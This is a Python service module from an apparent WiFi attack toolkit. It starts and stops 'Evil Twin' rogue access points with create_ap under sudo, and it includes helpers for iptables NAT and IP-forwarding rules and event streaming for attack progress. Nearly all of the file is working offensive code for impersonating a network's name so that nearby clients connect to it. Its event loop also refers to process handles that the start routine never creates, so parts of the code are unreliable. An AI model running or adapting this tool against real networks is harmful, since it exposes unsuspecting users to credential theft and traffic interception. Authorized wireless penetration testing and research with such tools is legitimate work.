import subprocess
import asyncio
import os
from typing import AsyncGenerator, Dict

from dotenv import load_dotenv
from app.helpers.network import disable_monitor
from app.repositories.wifi_network_repository import WifiNetworkRepository

import logging

# Dedicated logger for Evil Twin
evil_twin_logger = logging.getLogger("evil_twin")
if not evil_twin_logger.hasHandlers():
    handler = logging.FileHandler("evil_twin.log")
    formatter = logging.Formatter("%(asctime)s %(levelname)s: %(message)s")
    handler.setFormatter(formatter)
    evil_twin_logger.addHandler(handler)
    evil_twin_logger.setLevel(logging.DEBUG)
    evil_twin_logger.propagate = False


class WifiEvilTwinService:
    """
    Service to manage Evil Twin WiFi attacks using create_ap and iptables.
    """

    def __init__(self, db):
        self.repo = WifiNetworkRepository(db)
        self._running_attacks = {}  # key: hotspot_name, value: dict

    async def start_evil_twin(self, channel: str, interface: str, hotspot_name: str) -> str:
        """
        Start an Evil Twin attack using create_ap in no-internet mode. Returns the hotspot_name as identifier.
        Logs all steps and errors to evil_twin.log for troubleshooting.
        """
        # Load environment variables from .env
        load_dotenv()
        alfa_interface = interface or os.environ.get("ALFA_INTERFACE")
        key = hotspot_name
        if not alfa_interface:
            raise ValueError("ALFA_INTERFACE must be set in your .env file or environment.")

        if key in self._running_attacks and self._running_attacks[key]["status"] == "running":
            evil_twin_logger.warning(f"Evil twin already running for {hotspot_name}")
            raise ValueError(f"Evil twin attack already in progress for hotspot '{hotspot_name}'")

        try:
            # Use create_ap in no-internet mode
            create_ap_cmd = ["sudo", "create_ap", "-n", alfa_interface, hotspot_name]
            if channel:
                create_ap_cmd += ["-c", str(channel)]
            evil_twin_logger.info(f"[EvilTwin] Running: {' '.join(create_ap_cmd)}")
            create_ap_proc = subprocess.Popen(
                create_ap_cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
            )
        except Exception as e:
            evil_twin_logger.error(f"[EvilTwin] Failed to start create_ap: {e}")
            raise

        await asyncio.sleep(2)
        if create_ap_proc.poll() is not None:
            out, err = create_ap_proc.communicate()
            evil_twin_logger.error(f"[EvilTwin] create_ap exited early. Output:\n{out}\nError:\n{err}")
            raise RuntimeError(f"create_ap failed to start. Error: {err}")

        # No iptables or IP forwarding needed in no-internet mode
        self._running_attacks[key] = {
            "create_ap_proc": create_ap_proc,
            "interface": alfa_interface,
            "hotspot_name": hotspot_name,
            "start_time": asyncio.get_event_loop().time(),
            "status": "running",
        }
        await self.repo.update_status(hotspot_name, "EvilTwin")
        logging.info(f"[EvilTwin] Evil twin started for hotspot '{hotspot_name}' (no-internet mode)")
        return hotspot_name

    def _setup_iptables(self, internet_interface: str):
        """Set up required iptables rules for NAT and forwarding."""
        iptables_cmds = [
            ["sudo", "iptables", "-A", "FORWARD", "-i", "ap0", "-o", internet_interface, "-j", "ACCEPT"],
            [
                "sudo",
                "iptables",
                "-A",
                "FORWARD",
                "-i",
                internet_interface,
                "-o",
                "ap0",
                "-m",
                "state",
                "--state",
                "RELATED,ESTABLISHED",
                "-j",
                "ACCEPT",
            ],
            ["sudo", "iptables", "-t", "nat", "-A", "POSTROUTING", "-o", internet_interface, "-j", "MASQUERADE"],
        ]
        for cmd in iptables_cmds:
            logging.info(f"[EvilTwin] Running iptables: {' '.join(cmd)}")
            subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    def _enable_ip_forwarding(self):
        """Enable IP forwarding on the system."""
        logging.info("[EvilTwin] Enabling IP forwarding...")
        subprocess.Popen(
            ["sudo", "sysctl", "-w", "net.ipv4.ip_forward=1"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )

    async def stop_evil_twin(self, hotspot_name: str) -> Dict:
        """
        Stop the Evil Twin attack for the given hotspot_name.
        """
        key = hotspot_name
        if key not in self._running_attacks:
            return {
                "status": "not_found",
                "message": f"No evil twin attack found for hotspot '{hotspot_name}'",
            }
        attack = self._running_attacks[key]
        proc = attack.get("create_ap_proc")
        # 1. Terminate create_ap process
        try:
            if proc and proc.poll() is None:
                logging.info(f"[EvilTwin] Terminating create_ap for '{hotspot_name}'")
                proc.terminate()
                proc.wait(timeout=5)
        except Exception as e:
            logging.warning(f"[EvilTwin] Error terminating create_ap: {e}")

        # 2. Terminate dnsmasq_proc if exists
        if "dnsmasq_proc" in attack and attack["dnsmasq_proc"] and attack["dnsmasq_proc"].poll() is None:
            try:
                attack["dnsmasq_proc"].terminate()
                attack["dnsmasq_proc"].wait()
            except Exception as e:
                logging.warning(f"[EvilTwin] Error terminating dnsmasq_proc: {e}")

        # 3. Terminate airbase_proc if exists
        if "airbase_proc" in attack and attack["airbase_proc"] and attack["airbase_proc"].poll() is None:
            try:
                attack["airbase_proc"].terminate()
                attack["airbase_proc"].wait()
            except Exception as e:
                logging.warning(f"[EvilTwin] Error terminating airbase_proc: {e}")

        # 4. Disable monitor mode
        alfa_interface = attack.get("interface") or os.environ.get("ALFA_INTERFACE")
        internet_interface = attack.get("internet_interface") or os.environ.get("INTERNET_INTERFACE")
        try:
            disable_monitor(alfa_interface)
        except Exception as e:
            logging.warning(f"[EvilTwin] Error disabling monitor: {e}")

        # 5. Bring down twin interface if exists
        if "twin_interface" in attack:
            try:
                subprocess.run(
                    ["ifconfig", attack["twin_interface"], "down"],
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                )
            except Exception as e:
                logging.warning(f"[EvilTwin] Error ifconfig down: {e}")

        # 6. Flush iptables rules
        iptables_cmds = [
            ["sudo", "iptables", "-D", "FORWARD", "-i", "ap0", "-o", internet_interface, "-j", "ACCEPT"],
            [
                "sudo",
                "iptables",
                "-D",
                "FORWARD",
                "-i",
                internet_interface,
                "-o",
                "ap0",
                "-m",
                "state",
                "--state",
                "RELATED,ESTABLISHED",
                "-j",
                "ACCEPT",
            ],
            ["sudo", "iptables", "-t", "nat", "-D", "POSTROUTING", "-o", internet_interface, "-j", "MASQUERADE"],
        ]
        for cmd in iptables_cmds:
            try:
                logging.info(f"[EvilTwin] Running iptables: {' '.join(cmd)}")
                subprocess.run(cmd, check=True)
            except Exception as e:
                logging.warning(f"[EvilTwin] Error running iptables: {e}")

        # 7. Update status and return
        attack["status"] = "stopped"
        await self.repo.update_status(hotspot_name, "Main")
        logging.info(f"[EvilTwin] Evil twin stopped for hotspot '{hotspot_name}'")
        return {"status": "stopped", "message": f"Evil twin attack for '{hotspot_name}' stopped"}

    async def events(self, bssid: str) -> AsyncGenerator[str, None]:
        if bssid not in self._running_attacks:
            yield 'event: error\ndata: {"message":"No evil twin attack found"}\n\n'
            return

        attack = self._running_attacks[bssid]
        start_time = attack["start_time"]
        counter = 0
        yield 'event: start\ndata: {"message":"Evil twin attack started"}\n\n'

        try:
            while attack["status"] == "running":
                current_time = asyncio.get_event_loop().time()
                elapsed = int(current_time - start_time)
                counter += 1

                if attack["airbase_proc"].poll() is not None or attack["dnsmasq_proc"].poll() is not None:
                    await self.stop_evil_twin(bssid)
                    yield 'event: error\ndata: {"message":"Process terminated unexpectedly"}\n\n'
                    return

                yield f'event: progress\ndata: {{"elapsed":{elapsed},"heartbeat":{counter}}}\n\n'

                await asyncio.sleep(1)

            yield 'event: done\ndata: {"message":"Evil twin attack stopped"}\n\n'

        finally:
            if attack["status"] == "running":
                await self.stop_evil_twin(bssid)
